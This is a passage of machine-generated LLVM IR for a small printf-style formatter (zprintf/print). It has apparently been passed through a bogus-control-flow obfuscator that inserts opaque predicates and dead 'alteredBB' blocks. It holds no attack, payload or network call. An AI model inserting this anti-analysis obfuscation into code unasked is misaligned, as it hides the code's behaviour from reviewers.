  %87 = load i32, i32* %4, align 4
  %88 = sub nsw i32 %86, %87
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %85, i64 %89
  store i8 %84, i8* %90, align 1
  br label %91

; <label>:91:                                     ; preds = %79
  %92 = load i32, i32* @x.3
  %93 = load i32, i32* @y.4
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %91
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  %102 = load i32, i32* @x.3
  %103 = load i32, i32* @y.4
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart226, label %originalBB13alteredBB

originalBBpart226:                                ; preds = %originalBB13
  br label %75

; <label>:110:                                    ; preds = %75
  %111 = load i8*, i8** %2, align 8
  %112 = load i32, i32* %3, align 4
  %113 = load i32, i32* %4, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %117 = load i32, i32* %4, align 4
  %_ = sub i32 %117, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %117, 1
  %_2 = shl i32 %117, 1
  %_3 = sub i32 0, %117
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %117
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 %117, 1
  %gen8 = mul i32 %_7, 1
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %4, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %39
  %119 = load i32, i32* %5, align 4
  %120 = load i32, i32* %4, align 4
  %121 = icmp sge i32 %119, %120
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %91
  %122 = load i32, i32* %3, align 4
  %_14 = sub i32 %122, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 0, %122
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %122, 1
  %_19 = shl i32 %122, 1
  %_20 = sub i32 %122, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 %122, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %122, 1
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %3, align 4
  br label %originalBB13
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %originalBBpart2141, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %654

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %626

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %654

; <label>:46:                                     ; preds = %22
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %627

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @x.7
  %54 = load i32, i32* @y.8
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8*, i8** %5, align 8
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 45
  %65 = load i32, i32* @x.7
  %66 = load i32, i32* @y.8
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %64, label %73, label %76

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i8*, i8** %5, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %originalBBpart24
  br label %77

; <label>:77:                                     ; preds = %82, %76
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 48
  br i1 %81, label %82, label %87

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = or i32 %85, 2
  store i32 %86, i32* %8, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  br label %88

; <label>:88:                                     ; preds = %125, %87
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sge i32 %91, 48
  br i1 %92, label %93, label %98

; <label>:93:                                     ; preds = %88
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sle i32 %96, 57
  br label %98

; <label>:98:                                     ; preds = %93, %88
  %99 = phi i1 [ false, %88 ], [ %97, %93 ]
  br i1 %99, label %100, label %128

; <label>:100:                                    ; preds = %98
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %100
  %109 = load i32, i32* %7, align 4
  %110 = mul nsw i32 %109, 10
  store i32 %110, i32* %7, align 4
  %111 = load i8*, i8** %5, align 8
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = sub nsw i32 %113, 48
  %115 = load i32, i32* %7, align 4
  %116 = add nsw i32 %115, %114
  store i32 %116, i32* %7, align 4
  %117 = load i32, i32* @x.7
  %118 = load i32, i32* @y.8
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %125

; <label>:125:                                    ; preds = %originalBBpart210
  %126 = load i8*, i8** %5, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %5, align 8
  br label %88

; <label>:128:                                    ; preds = %98
  %129 = load i8*, i8** %5, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 115
  br i1 %132, label %133, label %199

; <label>:133:                                    ; preds = %128
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = icmp ule i32 %136, 40
  br i1 %137, label %138, label %160

; <label>:138:                                    ; preds = %133
  %139 = load i32, i32* @x.7
  %140 = load i32, i32* @y.8
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %138
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 3
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr i8, i8* %148, i32 %136
  %150 = bitcast i8* %149 to i32*
  %151 = add i32 %136, 8
  store i32 %151, i32* %135, align 8
  %152 = load i32, i32* @x.7
  %153 = load i32, i32* @y.8
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart219, label %originalBB12alteredBB

originalBBpart219:                                ; preds = %originalBB12
  br label %165

; <label>:160:                                    ; preds = %133
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 2
  %162 = load i8*, i8** %161, align 8
  %163 = bitcast i8* %162 to i32*
  %164 = getelementptr i8, i8* %162, i32 8
  store i8* %164, i8** %161, align 8
  br label %165

; <label>:165:                                    ; preds = %160, %originalBBpart219
  %166 = phi i32* [ %150, %originalBBpart219 ], [ %163, %160 ]
  %167 = load i32, i32* %166, align 4
  %168 = sext i32 %167 to i64
  %169 = inttoptr i64 %168 to i8*
  store i8* %169, i8** %11, align 8
  %170 = load i8**, i8*** %4, align 8
  %171 = load i8*, i8** %11, align 8
  %172 = icmp ne i8* %171, null
  br i1 %172, label %173, label %191

; <label>:173:                                    ; preds = %165
  %174 = load i32, i32* @x.7
  %175 = load i32, i32* @y.8
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %173
  %182 = load i8*, i8** %11, align 8
  %183 = load i32, i32* @x.7
  %184 = load i32, i32* @y.8
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %192

; <label>:191:                                    ; preds = %165
  br label %192

; <label>:192:                                    ; preds = %191, %originalBBpart223
  %193 = phi i8* [ %182, %originalBBpart223 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0), %191 ]
  %194 = load i32, i32* %7, align 4
  %195 = load i32, i32* %8, align 4
  %196 = call i32 @prints(i8** %170, i8* %193, i32 %194, i32 %195)
  %197 = load i32, i32* %9, align 4
  %198 = add nsw i32 %197, %196
  store i32 %198, i32* %9, align 4
  br label %635

; <label>:199:                                    ; preds = %128
  %200 = load i32, i32* @x.7
  %201 = load i32, i32* @y.8
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %199
  %208 = load i8*, i8** %5, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 100
  %212 = load i32, i32* @x.7
  %213 = load i32, i32* @y.8
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %211, label %220, label %293

; <label>:220:                                    ; preds = %originalBBpart227
  %221 = load i32, i32* @x.7
  %222 = load i32, i32* @y.8
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %220
  %229 = load i8**, i8*** %4, align 8
  %230 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = icmp ule i32 %232, 40
  %234 = load i32, i32* @x.7
  %235 = load i32, i32* @y.8
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %233, label %242, label %264

; <label>:242:                                    ; preds = %originalBBpart231
  %243 = load i32, i32* @x.7
  %244 = load i32, i32* @y.8
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %242
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 3
  %252 = load i8*, i8** %251, align 8
  %253 = getelementptr i8, i8* %252, i32 %232
  %254 = bitcast i8* %253 to i32*
  %255 = add i32 %232, 8
  store i32 %255, i32* %231, align 8
  %256 = load i32, i32* @x.7
  %257 = load i32, i32* @y.8
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart245, label %originalBB33alteredBB

originalBBpart245:                                ; preds = %originalBB33
  br label %269

; <label>:264:                                    ; preds = %originalBBpart231
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 2
  %266 = load i8*, i8** %265, align 8
  %267 = bitcast i8* %266 to i32*
  %268 = getelementptr i8, i8* %266, i32 8
  store i8* %268, i8** %265, align 8
  br label %269

; <label>:269:                                    ; preds = %264, %originalBBpart245
  %270 = phi i32* [ %254, %originalBBpart245 ], [ %267, %264 ]
  %271 = load i32, i32* @x.7
  %272 = load i32, i32* @y.8
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %269
  %279 = load i32, i32* %270, align 4
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @printi(i8** %229, i32 %279, i32 10, i32 1, i32 %280, i32 %281, i32 97)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  %285 = load i32, i32* @x.7
  %286 = load i32, i32* @y.8
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart251, label %originalBB47alteredBB

originalBBpart251:                                ; preds = %originalBB47
  br label %635

; <label>:293:                                    ; preds = %originalBBpart227
  %294 = load i8*, i8** %5, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 120
  br i1 %297, label %298, label %355

; <label>:298:                                    ; preds = %293
  %299 = load i32, i32* @x.7
  %300 = load i32, i32* @y.8
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %298
  %307 = load i8**, i8*** %4, align 8
  %308 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %309 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 8
  %311 = icmp ule i32 %310, 40
  %312 = load i32, i32* @x.7
  %313 = load i32, i32* @y.8
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %311, label %320, label %342

; <label>:320:                                    ; preds = %originalBBpart255
  %321 = load i32, i32* @x.7
  %322 = load i32, i32* @y.8
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %320
  %329 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %308, i32 0, i32 3
  %330 = load i8*, i8** %329, align 8
  %331 = getelementptr i8, i8* %330, i32 %310
  %332 = bitcast i8* %331 to i32*
  %333 = add i32 %310, 8
  store i32 %333, i32* %309, align 8
  %334 = load i32, i32* @x.7
  %335 = load i32, i32* @y.8
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart272, label %originalBB57alteredBB

originalBBpart272:                                ; preds = %originalBB57
  br label %347

; <label>:342:                                    ; preds = %originalBBpart255
  %343 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %308, i32 0, i32 2
  %344 = load i8*, i8** %343, align 8
  %345 = bitcast i8* %344 to i32*
  %346 = getelementptr i8, i8* %344, i32 8
  store i8* %346, i8** %343, align 8
  br label %347

; <label>:347:                                    ; preds = %342, %originalBBpart272
  %348 = phi i32* [ %332, %originalBBpart272 ], [ %345, %342 ]
  %349 = load i32, i32* %348, align 4
  %350 = load i32, i32* %7, align 4
  %351 = load i32, i32* %8, align 4
  %352 = call i32 @printi(i8** %307, i32 %349, i32 16, i32 0, i32 %350, i32 %351, i32 97)
  %353 = load i32, i32* %9, align 4
  %354 = add nsw i32 %353, %352
  store i32 %354, i32* %9, align 4
  br label %635

; <label>:355:                                    ; preds = %293
  %356 = load i32, i32* @x.7
  %357 = load i32, i32* @y.8
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %355
  %364 = load i8*, i8** %5, align 8
  %365 = load i8, i8* %364, align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 88
  %368 = load i32, i32* @x.7
  %369 = load i32, i32* @y.8
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %367, label %376, label %433

; <label>:376:                                    ; preds = %originalBBpart276
  %377 = load i32, i32* @x.7
  %378 = load i32, i32* @y.8
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %376
  %385 = load i8**, i8*** %4, align 8
  %386 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %387 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 0
  %388 = load i32, i32* %387, align 8
  %389 = icmp ule i32 %388, 40
  %390 = load i32, i32* @x.7
  %391 = load i32, i32* @y.8
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %389, label %398, label %404

; <label>:398:                                    ; preds = %originalBBpart280
  %399 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 3
  %400 = load i8*, i8** %399, align 8
  %401 = getelementptr i8, i8* %400, i32 %388
  %402 = bitcast i8* %401 to i32*
  %403 = add i32 %388, 8
  store i32 %403, i32* %387, align 8
  br label %409

; <label>:404:                                    ; preds = %originalBBpart280
  %405 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 2
  %406 = load i8*, i8** %405, align 8
  %407 = bitcast i8* %406 to i32*
  %408 = getelementptr i8, i8* %406, i32 8
  store i8* %408, i8** %405, align 8
  br label %409

; <label>:409:                                    ; preds = %404, %398
  %410 = phi i32* [ %402, %398 ], [ %407, %404 ]
  %411 = load i32, i32* @x.7
  %412 = load i32, i32* @y.8
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %409
  %419 = load i32, i32* %410, align 4
  %420 = load i32, i32* %7, align 4
  %421 = load i32, i32* %8, align 4
  %422 = call i32 @printi(i8** %385, i32 %419, i32 16, i32 0, i32 %420, i32 %421, i32 65)
  %423 = load i32, i32* %9, align 4
  %424 = add nsw i32 %423, %422
  store i32 %424, i32* %9, align 4
  %425 = load i32, i32* @x.7
  %426 = load i32, i32* @y.8
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart286, label %originalBB82alteredBB

originalBBpart286:                                ; preds = %originalBB82
  br label %635

; <label>:433:                                    ; preds = %originalBBpart276
  %434 = load i32, i32* @x.7
  %435 = load i32, i32* @y.8
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %433
  %442 = load i8*, i8** %5, align 8
  %443 = load i8, i8* %442, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 117
  %446 = load i32, i32* @x.7
  %447 = load i32, i32* @y.8
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %445, label %454, label %527

; <label>:454:                                    ; preds = %originalBBpart290
  %455 = load i32, i32* @x.7
  %456 = load i32, i32* @y.8
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %454
  %463 = load i8**, i8*** %4, align 8
  %464 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %465 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 8
  %467 = icmp ule i32 %466, 40
  %468 = load i32, i32* @x.7
  %469 = load i32, i32* @y.8
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %467, label %476, label %498

; <label>:476:                                    ; preds = %originalBBpart294
  %477 = load i32, i32* @x.7
  %478 = load i32, i32* @y.8
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %476
  %485 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 3
  %486 = load i8*, i8** %485, align 8
  %487 = getelementptr i8, i8* %486, i32 %466
  %488 = bitcast i8* %487 to i32*
  %489 = add i32 %466, 8
  store i32 %489, i32* %465, align 8
  %490 = load i32, i32* @x.7
  %491 = load i32, i32* @y.8
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart2101, label %originalBB96alteredBB

originalBBpart2101:                               ; preds = %originalBB96
  br label %519

; <label>:498:                                    ; preds = %originalBBpart294
  %499 = load i32, i32* @x.7
  %500 = load i32, i32* @y.8
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %498
  %507 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 2
  %508 = load i8*, i8** %507, align 8
  %509 = bitcast i8* %508 to i32*
  %510 = getelementptr i8, i8* %508, i32 8
  store i8* %510, i8** %507, align 8
  %511 = load i32, i32* @x.7
  %512 = load i32, i32* @y.8
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
